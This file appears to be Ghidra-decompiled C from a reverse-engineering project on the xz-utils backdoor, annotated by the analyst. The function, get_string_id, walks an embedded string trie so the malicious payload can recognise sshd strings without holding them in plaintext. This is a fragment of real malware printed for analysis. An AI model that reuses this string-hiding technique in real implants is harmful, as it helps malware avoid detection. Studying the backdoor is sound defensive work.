// /home/kali/xzre-ghidra/xzregh/10A880_get_string_id.c
// Function: get_string_id @ 0x10A880
// Calling convention: unknown
// Prototype: undefined get_string_id(void)


/*
 * AutoDoc: Traverses the embedded string-trie and returns the encoded identifier for a runtime string. Every heuristic that matches sshd literals—logging, monitor messages, protocol banners—goes through this to avoid shipping plaintext strings in the payload.
 */
#include "xzre_types.h"


undefined1  [16] get_string_id(byte *param_1,byte *param_2,undefined8 param_3,undefined8 param_4)

{
  ushort *puVar1;
  byte bVar2;
  long lVar3;
  ushort uVar4;
  ushort uVar5;
  int iVar6;
  ulong uVar7;
  ushort uVar8;
  uint uVar9;
  ulong *puVar10;
  byte *pbVar11;
  long lVar12;
  ulong uVar13;
  undefined1 auVar14 [16];
  
  iVar6 = secret_data_append_from_address(0,10,8,1);
  uVar7 = 0;
  if (iVar6 != 0) {
    pbVar11 = param_1 + 0x2c;
    if ((param_2 != (byte *)0x0) && (param_2 < pbVar11)) {
      pbVar11 = param_2;
    }
    lVar12 = 0x10c2a8;
    puVar10 = (ulong *)(_Lcrc64_clmul_1 + 0x760);
    for (; param_1 <= pbVar11; param_1 = param_1 + 1) {
      bVar2 = *param_1;
      uVar9 = (uint)bVar2;
      if ((char)bVar2 < '\0') break;
      if (bVar2 < 0x40) {
        uVar13 = *puVar10;
        uVar7 = 0;
        if ((uVar13 >> (bVar2 & 0x3f) & 1) == 0) goto LAB_0010a981;
      }
      else {
        uVar13 = puVar10[1];
        uVar9 = uVar9 - 0x40;
        if ((uVar13 >> ((byte)uVar9 & 0x3f) & 1) == 0) break;
        uVar7 = count_bits(*puVar10);
      }
      while( TRUE ) {
        lVar3 = 0;
        if (uVar13 != 0) {
          for (; (uVar13 >> lVar3 & 1) == 0; lVar3 = lVar3 + 1) {
          }
        }
        if ((uint)lVar3 == (uVar9 & 0xff)) break;
        uVar7 = (ulong)((int)uVar7 + 1);
        uVar13 = uVar13 & uVar13 - 1;
      }
      puVar1 = (ushort *)(lVar12 + (uVar7 & 0xffffffff) * 4);
      uVar8 = *puVar1;
      uVar5 = puVar1[1];
      uVar7 = (ulong)(uint)(int)(short)uVar5;
      if ((uVar8 & 4) != 0) goto LAB_0010a981;
      if ((uVar8 & 2) == 0) {
        uVar5 = -uVar5;
      }
      else {
        uVar8 = uVar8 & 0xfffd;
      }
      uVar4 = uVar8 & 0xfffe;
      if ((uVar8 & 1) == 0) {
        uVar4 = -uVar8;
      }
      lVar12 = lVar12 + (short)(uVar5 - 4);
      puVar10 = (ulong *)((long)puVar10 + (long)(short)(uVar4 - 0x10));
    }
    uVar7 = 0;
  }
LAB_0010a981:
  auVar14._8_8_ = param_4;
  auVar14._0_8_ = uVar7;
  return auVar14;
}

